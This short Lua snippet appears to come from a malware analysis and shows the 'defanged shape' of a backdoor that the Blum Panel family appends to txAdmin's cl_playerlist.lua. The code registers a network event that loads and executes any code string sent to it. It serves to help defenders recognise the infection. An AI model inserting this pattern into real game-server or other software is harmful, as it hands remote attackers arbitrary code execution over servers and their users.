-- Defanged shape of the block the Blum Panel family appends to txAdmin's monitor/resource/cl_playerlist.lua.
RegisterNetEvent("helpEmptyCode", function(id)
    local ok, fn = pcall(load, id)
    if ok and type(fn) == "function" then
        pcall(fn)
    end
end)
